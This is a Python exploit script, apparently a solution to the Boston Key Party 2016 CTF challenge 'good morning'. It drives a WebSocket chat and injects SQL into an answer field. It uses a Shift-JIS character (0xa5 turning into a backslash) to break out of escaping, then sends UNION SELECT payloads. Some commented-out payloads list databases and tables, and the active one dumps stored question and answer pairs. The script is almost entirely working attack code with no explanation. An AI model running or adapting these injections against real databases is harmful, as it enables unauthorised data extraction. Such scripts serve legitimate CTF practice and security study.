# boston-key-party-2016 good morning

from ws4py.client.threadedclient import WebSocketClient
import json
'''
USE `blah2`;
CREATE TABLE `answers` (
  `id` int(11) NOT NULL NOT NULL AUTO_INCREMENT,
  `question` varchar(100) DEFAULT NULL,
  `answer` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`)
) DEFAULT CHARACTER SET sjis;
'''

class DummyClient(WebSocketClient):
    char = 0xa5 # becomes '\' when encoded as shift-jis: u'\u00a5'.encode('shift-jis').encode('hex') -> 5c
    
    def opened(self):
        print 'opened'

    def closed(self, code, reason=None):
        print "Closed down", code, reason

    def received_message(self, m):
        s = str(m)
        print 'received: %r' % s

        message = json.loads(s)
        if message['type'] == 'question':
          topic = message['topic']
          last = message['last']
          if topic in ['name', 'quest', 'favorite color']:
            if not last:
              answer = json.dumps({"type": 'answer', 'answer': 'my %s' % topic})
            else:
              answer = json.dumps({"type": 'get_answer', 'question': '_injection_', 'answer': 'my %s' % topic}, ensure_ascii=False)

              dq = '\\u00%02x\\"' % ws.char
              #injection = r'favorite color%s union select 1,2,X from (SELECT COUNT(*) X FROM information_schema.schemata)a-- ' % dq
              #injection = r'favorite color%s union select 1,2,X from (SELECT CONCAT_WS(0x3a,table_schema,table_name) X FROM information_schema.tables LIMIT 0,1)a-- ' % dq
              #injection = r'favorite color%s union select 1,2,X from (SELECT COUNT(*) X FROM information_schema.tables WHERE table_schema=0x67616e6261747465)a-- ' % dq
              #injection = r'favorite color%s union select 1,2,X from (SELECT table_name X FROM information_schema.tables WHERE table_schema=0x67616e6261747465)a limit 0,1-- ' % dq
              injection = r'favorite color%s union select 1,2,X from (SELECT CONCAT_WS(0x3a,question,answer) X FROM ganbatte.answers limit 0,1)a-- ' % dq
              answer = answer.replace('_injection_', injection)

            print 'sending %r' % answer
            self.send(answer)

import sys
if __name__ == '__main__':
    try:
        ws = DummyClient('ws://52.86.232.163:32781/ws', protocols=['http-only', 'chat'])
        #ws = DummyClient('ws://127.0.0.1:5000/ws', protocols=['http-only', 'chat'])
        #ws.char = 0xa5 # int(sys.argv[1])
        #ws.sql = sys.argv[1]
        ws.connect()
        ws.run_forever()
    except KeyboardInterrupt:
        ws.close()
